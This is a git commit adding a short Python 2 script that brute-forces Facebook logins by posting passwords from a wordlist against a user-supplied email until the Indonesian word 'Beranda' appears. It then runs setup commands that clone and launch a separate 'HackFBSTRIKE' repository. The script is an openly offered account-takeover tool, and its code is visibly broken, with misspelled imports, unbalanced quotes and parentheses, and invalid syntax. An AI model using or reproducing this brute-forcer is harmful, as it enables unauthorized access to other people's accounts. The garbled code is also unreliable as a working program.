fb3007391fb4ec43d8ac1db1b0e0308c0f3f313f
MrNOOB <56033162+MrNOOB07@users.noreply.github.com>
2019-10-11 18:07:21 +0700

    python2 Strike.py

---
+++ python2 Strike.py
@@ -0,0 +1,31 @@
+#!/ust/bin/python2
+import os
+import request
+import time
+import sys
+email = raw_input("email_> )
+url='https://free.facebook.com/login.php
+ex = open'('word.txt'), 'r')readlines()
+    
+for line in ex:
+    password = line.strip')
+    http = requests.post(url, data={'email':email, 'pass':password,'login':'submit'
+    content = http.content
+    if "Beranda" in content:
+        print "[+]Password Found ",password
+    else :
+        print "[+]Password Invalid "
+def usage():
+           print("By MrNOOB07")
+print ("[1] HackFBSTRIKE")
+tools = input "(pilih=>)
+if tools ==1:
+         os.system("clear")
+         os.system("pkg install update")
+         os.system("pkg install upgrade")
+         os.system("pkg install python")
+         os.system("pkg install python2")
+         os.system("pkg install git")
+         os.system("git clone https://github.com/MrNOOB07/HackFBSTRIKE")
+         os.system("cd HackFBSTRIKE")
+         os.system("python2 python.py")
